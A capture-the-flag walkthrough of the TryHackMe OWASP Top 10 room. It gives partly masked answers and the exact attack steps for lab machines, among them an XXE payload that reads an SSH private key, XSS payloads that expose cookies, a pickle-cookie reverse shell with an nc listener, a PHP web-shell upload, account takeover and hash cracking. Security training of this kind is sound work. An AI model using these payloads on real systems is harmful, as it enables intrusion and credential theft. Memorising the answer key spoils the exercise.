# Owasp Top 10

- [Tools](#tools)
- [Introduction](#introduction)
- [Accessing machines](#accessing-machines)
- [[Severity 1] Injection](#severity-1-injection)
- [[Severity 1] OS Command Injection](#severity-1-os-command-injection)
- [[Severity 1] Command Injection Practical](#severity-1-command-injection-practical)
- [[Severity 2] Broken Authentication](#severity-2-broken-authentication)
- [[Severity 2] Broken Authentication Practical](#severity-2-broken-authentication-practical)
- [[Severity 3] Sensitive Data Exposure (Introduction)](#severity-3-sensitive-data-exposure-introduction)
- [[Severity 3] Sensitive Data Exposure (Supporting Material 1)](#severity-3-sensitive-data-exposure-supporting-material-1)
- [[Severity 3] Sensitive Data Exposure (Supporting Material 2)](#severity-3-sensitive-data-exposure-supporting-material-2)
- [[Severity 3] Sensitive Data Exposure (Challenge)](#severity-3-sensitive-data-exposure-challenge)
- [[Severity 4] XML External Entity](#severity-4-xml-external-entity)
- [[Severity 4] XML External Entity - eXtensible Markup Language](#severity-4-xml-external-entity---extensible-markup-language)
- [[Severity 4] XML External Entity - DTD](#severity-4-xml-external-entity---dtd)
- [[Severity 4] XML External Entity - XXE Payload](#severity-4-xml-external-entity---xxe-payload)
- [[Severity 4] XML External Entity - Exploiting](#severity-4-xml-external-entity---exploiting)
- [[Severity 5] Broken Access Control](#severity-5-broken-access-control)
- [[Severity 5] Broken Access Control (IDOR Challenge)](#severity-5-broken-access-control-idor-challenge)
- [[Severity 6] Security Misconfiguration](#severity-6-security-misconfiguration)
- [[Severity 7] Cross-site Scripting](#severity-7-cross-site-scripting)
- [[Severity 8] Insecure Deserialization](#severity-8-insecure-deserialization)
- [[Severity 8] Insecure Deserialization - Objects](#severity-8-insecure-deserialization---objects)
- [[Severity 8] Insecure Deserialization - Deserialization](#severity-8-insecure-deserialization---deserialization)
- [[Severity 8] Insecure Deserialization - Cookies](#severity-8-insecure-deserialization---cookies)
- [[Severity 8] Insecure Deserialization - Cookies Practical](#severity-8-insecure-deserialization---cookies-practical)
- [[Severity 8] Insecure Deserialization - Code Execution](#severity-8-insecure-deserialization---code-execution)
- [[Severity 9] Components With Known Vulnerabilities - Intro](#severity-9-components-with-known-vulnerabilities---intro)
- [[Severity 9] Components With Known Vulnerabilities - Exploit](#severity-9-components-with-known-vulnerabilities---exploit)
- [[Severity 9] Components With Known Vulnerabilities - Lab](#severity-9-components-with-known-vulnerabilities---lab)
- [[Severity 10] Insufficient Logging and Monitoring](#severity-10-insufficient-logging-and-monitoring)
- [What Next?](#what-next)

Room Link: https://tryhackme.com/r/room/owasptop10

```bash

 $$$$$$\  $$\      $$\  $$$$$$\   $$$$$$\  $$$$$$$\  
$$  __$$\ $$ | $\  $$ |$$  __$$\ $$  __$$\ $$  __$$\ 
$$ /  $$ |$$ |$$$\ $$ |$$ /  $$ |$$ /  \__|$$ |  $$ |
$$ |  $$ |$$ $$ $$\$$ |$$$$$$$$ |\$$$$$$\  $$$$$$$  |
$$ |  $$ |$$$$  _$$$$ |$$  __$$ | \____$$\ $$  ____/ 
$$ |  $$ |$$$  / \$$$ |$$ |  $$ |$$\   $$ |$$ |      
 $$$$$$  |$$  /   \$$ |$$ |  $$ |\$$$$$$  |$$ |      
 \______/ \__/     \__|\__|  \__| \______/ \__|      
                                                     
                                                     
                                                     
$$$$$$$$\  $$$$$$\  $$$$$$$\    $$\   $$$$$$\        
\__$$  __|$$  __$$\ $$  __$$\ $$$$ | $$$ __$$\       
   $$ |   $$ /  $$ |$$ |  $$ |\_$$ | $$$$\ $$ |      
   $$ |   $$ |  $$ |$$$$$$$  |  $$ | $$\$$\$$ |      
   $$ |   $$ |  $$ |$$  ____/   $$ | $$ \$$$$ |      
   $$ |   $$ |  $$ |$$ |        $$ | $$ |\$$$ |      
   $$ |    $$$$$$  |$$ |      $$$$$$\\$$$$$$  /      
   \__|    \______/ \__|      \______|\______/       
                                                     
                                                     
```

## Tools
1. sqlite3
2. [Cracktation.net](https://crackstation.net/)
3. Browser Debugging Tools (CTRL+SHIFT+I)
4. Browser Source Code Viewer (CTRL+U)
   
## Introduction
1. Join the machine
2. Read Instructions and click on Complete.
## Accessing machines
1. Goto Access and get ovpn file to connect https://tryhackme.com/access
2. Or, Start attackbox for testing.
## [Severity 1] Injection 
1. Read carefully this section and click on Complete.
## [Severity 1] OS Command Injection
1. Read this section and mentioned [article](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#spawn-tty-shell), then  click on Complete. 
## [Severity 1] Command Injection Practical
1. Start Machine and get Target IP from "Target Machine Information". Now, open `http://machine_ip/evilshell.php`.
2. Now, type commands and submit. You can see output below.
3. Question `What strange text file is in the website root directory?` Answer `drpepper.txt`. Running `ls` command will show this strange text file.
4. Question `How many non-root/non-service/non-daemon users are there?` Answer `0`. Running `cat /etc/passwd` will show.
5. Question `What user is this app running as?` Answer `www-data`. Used command `whoami`.
6. Question `What is the user's shell set as?` Answer `/usr/sbin/nologin`. Command used `getent passwd www-data` or `cat /etc/passwd |grep www-data`.
7. Question `What version of Ubuntu is running?` Answer ``. Command used `lsb_release -a`.
8. Question `Print out the MOTD.  What favorite beverage is shown?` Answer `DR PEPPER`. Used command `cat /etc/update-motd.d/00-header`.
## [Severity 2] Broken Authentication
1. Read this section carefully and click on Complete.
## [Severity 2] Broken Authentication Practical
1. If any machine is running, terminate that machine first. Then Start this Machine. Copy Target IP from "Target Machine Information" and open `http://MACHINE_IP:8888`.
2. Question `What is the flag that you found in darren's account?` Answer `fe860794************74b667`. To get flag inside darren's account, register as " darren" and login. Here you need to use whitespace before darren's name.
3. Test same trick with user `arthur` and click on Complete.
4. Question `What is the flag that you found in arthur's account?` Answer `d9ac0f7************75e16e`.
## [Severity 3] Sensitive Data Exposure (Introduction)
1. If any machine is running, terminate that machine first. Then Start this Machine. Copy Target IP from "Target Machine Information".
2. Read this section carefully and click on Complete.
## [Severity 3] Sensitive Data Exposure (Supporting Material 1)
1. Read this section carefully and click on Complete.
## [Severity 3] Sensitive Data Exposure (Supporting Material 2)
1. Read this section carefully and click on Complete.
## [Severity 3] Sensitive Data Exposure (Challenge)
1. If we open the machine link and check source, we can get a image link to `http://machine_ip/assets/images/lake-taupo.jpg`.
2. Now if we navigate to `http://machine_ip/assets` directory, there is a sensitive databse file named `webapp.db`.
3. Question `What is the name of the mentioned directory?` Answer `/assets`.
4. Question `Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?` Answer `webapp.db`. It's a file inside `/assets`.
5. Now Downloding the file and analyzing the file with `file webapp.db` command shows it's a `sqlite3` file. Now, we can read the db file with `sqlite3 webapp.db`.
6. If we use `.table` command to get table names, we will see there is two table named `session` and `users`. We can get column names using `PRAGMA table_info(users);` command.
   ```bash
    $> sqlite3 webapp.db 
     SQLite version 3.37.2 2022-01-06 13:25:41
     Enter ".help" for usage hints.
    sqlite> .tables
    sessions  users   
    sqlite> PRAGMA table_info(users);
    0|userID|TEXT|1||1
    1|username|TEXT|1||0
    2|password|TEXT|1||0
    3|admin|INT|1||0
    sqlite> 
   ```
7. `select * from users;` will show user's details inside the table. We can get admin hash there `6eea9b7ef191*******0f6c05ceb`.
  ```bash
    sqlite> select * from users;
    4413096d9c933359b898b6202288a650|admin|6eea9b7ef191******f6c05ceb|1
    23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
    4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
    sqlite> 
  ```
8. Question `Use the supporting material to access the sensitive data. What is the password hash of the admin user?` Answer `6eea9b7ef191*****dd0f6c05ceb`.
9. Question `What is the admin's plaintext password?` Answer `qwe****op`. We can crack the hash using [CrackStation](https://crackstation.net/).
10. Question `Login as the admin. What is the flag?` Answer `THM{Yzc2Yjd*************diMjdl}`. If we goto `http://machine_ip/login` and login with username `admin` and the cracked password `qw*****iop`, it will redirect to `http://machine_ip/console/`. There we can get the flag.
## [Severity 4] XML External Entity
1. If any machine is running, terminate that machine first. Then Start this Machine. Copy Target IP from "Target Machine Information".
2. Read this section carefully and click on Complete.
## [Severity 4] XML External Entity - eXtensible Markup Language
1. Read this section carefully and then start answering.
2. Question `Full form of XML` Answer `eXtensible Markup Language`
3. Question `Is it compulsory to have XML prolog in XML documents?` Answer `No`
4. Question `Can we validate XML documents against a schema?` Answer `Yes`
5. Question `How can we specify XML version and encoding in XML document?` Answer `xml prolog`
## [Severity 4] XML External Entity - DTD
1. Question `How do you define a new ELEMENT?` Answer `!ELEMENT`
2. Question `How do you define a ROOT element?` Answer `!DOCTYPE`
3. Question `How do you define a new ENTITY?` Answer `!ENTITY`
## [Severity 4] XML External Entity - XXE Payload
1. Read this section carefully and click on Complete.
## [Severity 4] XML External Entity - Exploiting
1. Now open http://machine_ip
2. Used given payload in last section to print `falcon feast` and clicked on Complete.
3. Again used payload from last section to read `/etc/passwd` and clicked on complete.
4. Question `What is the name of the user in /etc/passwd` Answer `falcon`. We read it from output of last payload.
5. Now we can use same payload with replacing file from `/etc/passwd` to ssh file location `/home/falcon/.ssh/id_rsa`.
6. Question `Where is falcon's SSH key located?` Answer `/home/falcon/.ssh/id_rsa`.
7. New payload to read SSH file,
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE root [<!ENTITY read SYSTEM '/home/falcon/.ssh/id_rsa'>]>
   <root>&read;</root>
   ```
8. Question `What are the first 18 characters for falcon's private key` Answer `MIIEogI****CAQEA7b`
## [Severity 5] Broken Access Control
1. Read this section carefully and click on Complete.
## [Severity 5] Broken Access Control (IDOR Challenge)
1. If any machine is running, terminate that machine first. Then Start this Machine. Copy Target IP from "Target Machine Information".
2. Read and understand how IDOR works and click on Complete.
3. Open `http://machine_ip/` and login with username `note` and password `test123`, then click on Complete.
4. Question `Look at other users notes. What is the flag?` Answer `flag{fivef***three}`. Got it by changing note id to 0 and visiting link `http://machine_ip/note.php?note=0`.
## [Severity 6] Security Misconfiguration
1. If any machine is running, terminate that machine first. Then Start this Machine. Copy Target IP from "Target Machine Information".
2. Read this section carefully, deploy the vm and click on Complete.
3. If we open the `machine_ip`, we can get a webapp name `Pensive Notes`. After googling I got default username password in a github repo https://github.com/NinjaJc01/PensiveNotes. Default credential of Pensive Notes is `pensive:PensiveNotes`.
4. Question `Hack into the webapp, and find the flag!` Answer `thm{4b95139*******a1f9d672e17}`
## [Severity 7] Cross-site Scripting
1. If any machine is running, terminate that machine first. Then Start this Machine. Copy Target IP from "Target Machine Information".
2. Read this section carefully, deploy the vm and click on Complete.
3. Question `Navigate to http://machine_ip in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".` Answer `ThereIsMoreToXSSThanYouThink`. Used payload `<script>alert("Hello")</script>`, PoC link http://machine_ip/reflected?keyword=%3Cscript%3Ealert(%22Hello%22)%3C/script%3E
4. Question `On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.` Answer `ReflectiveXss4TheWin`. Used payload `<script>alert(window.location.hostname)</script>`, PoC link http://machine_ip/reflected?keyword=%3Cscript%3Ealert(window.location.hostname)%3C/script%3E
5. Now goto `http://machine_ip/stored` and create an account.
6. Question `Then add a comment and see if you can insert some of your own HTML.` Answer `HTML_T4gs`. Commented `<img>` in `http://machine_ip/stored`.
7. `On the same page, create an alert popup box appear on the page with your document cookies.` Answer `W3LL_D0N3_LVL2` Payload used `<script>alert(document.cookie)</script>`
8. Now used payload to change title from `` to ``. Payload used `<script>document.querySelector("#thm-title").textContent="I am a hacker"</script>`.
9. Question `Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.` Answer `websites_can_be_easily_defaced_with_xss`
## [Severity 8] Insecure Deserialization
1. If any machine is running, terminate that machine first. Then Start this Machine. Copy Target IP from "Target Machine Information".
2. Read this section carefully.
3. Question `Who developed the Tomcat application?` Answer `The Apache Software Foundation`
4. Question `What type of attack that crashes services can be performed with insecure deserialization?` Answer `Denial of Service`
## [Severity 8] Insecure Deserialization - Objects
1. Read this section.
2. Question `if a dog was sleeping, would this be: A) A State B) A Behaviour` Answer `A Behaviour`
## [Severity 8] Insecure Deserialization - Deserialization
1. Read this section.
2. Question `What is the name of the base-2 formatting that data is sent across a network as?` Answer `binary`
## [Severity 8] Insecure Deserialization - Cookies
1. Read this section carefully.
2. Question `If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?` Answer `webapp.com/login/`
3. Question `What is the acronym for the web technology that Secure cookies work over?` Answer `https`
## [Severity 8] Insecure Deserialization - Cookies Practical
1. Open `http://machine_ip/register`, create a account and login.
2. Press `CTRL+SHIFT+I` and goto Storage section to read and edit cookies.
3. Copy value of `sessionId` cookie and decode it with base64 decoder. Command to decode base64, `echo "gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAN2Y1MWRiYWFhZjY2NDYwMzkyNTNiNTlkOTY3NTAwYWVxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==" |base64 -d`. You will get the first flag.
4. Question `1st flag (cookie value)` Answer `THM{good******se64_huh}`
5. Then edit `userType` cookie value to `admin` from `user` and reload the page and it will redirect to the admin page and show the flag.
6. Question `2nd flag (admin dashboard)` Answer `THM{heres******in_flag}`
## [Severity 8] Insecure Deserialization - Code Execution
1. Start listner to listen with `nc -lvp 4444` command.
2. Change cookie `userType` value to `user` from `admin`. Open `http://machine_ip/myprofile`, then click on `Exchange on vim` and after that `feedback`. Give feedback.
3. We need to follow instructions carefully. First we need to change download [pickleme.py](https://assets.tryhackme.com/additional/cmn-owasptopten/pickleme.py) and  "YOUR_TRYHACKME_VPN_IP" with your TryHackMe VPN IP. To get IP of TryHackMe you can use `ifconfig tun0 |grep destination |cut -d" " -f10` command. Then run the python script with `python3 pickleme.py`. Copy the cookie and add a cookie with that value, name it `encodedPayload`. Reload feedback page. You will get a netcat shell. You can read flag using `cat ../flag.txt` command.
4. Question `flag.txt` Answer `4a69a7***fd68`
## [Severity 9] Components With Known Vulnerabilities - Intro
1. Read Instructions and click on Complete.
## [Severity 9] Components With Known Vulnerabilities - Exploit
1. Read Instructions and click on Complete.
## [Severity 9] Components With Known Vulnerabilities - Lab
1. If any machine is running, terminate that machine first. Then Start this Machine. Copy Target IP from "Target Machine Information".
2. When we open `http://machine_ip`, we get link to `http://machine_ip/admin.php` and `projectworlds.in` link. After searching bookstore on `projectworlds.in`, we get this page https://projectworlds.in/free-projects/php-projects/online-book-store-project-in-php/ with default credential username: admin@admin.com password: admin.
3. After logging into admin panel, we can upload our shell by editing any book. Shell code, `<?php system('wc -c /etc/passwd'); ?>` in shell.php. After going to edit book, upload shell.php with `change` button.
4. Now to find the shell, open location of image. You can find all images in `/bootstrap/img` directory. Just open the directory in the link, you can get your uploaded shell there, `http://machine_ip/bootstrap/img/shell.php`. If you open the page, it will compile and execute the code to display character number of `/etc/passwd`.
5. Question `How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)` Answer `1611`
## [Severity 10] Insufficient Logging and Monitoring
1. Read this section carefully.
2. Question `What IP address is the attacker using?` Answer `49.99.13.16`. We can check lot of unauthorized login from this ip.
3. Question `What kind of attack is being carried out?` Answer `Bruteforce`. As we can see many unatuthorized usernames requested.
## What Next?
1. Just click Complete. Done!


Author: [Zishan Ahamed Thandar](https://ZishanAdThandar.github.io)
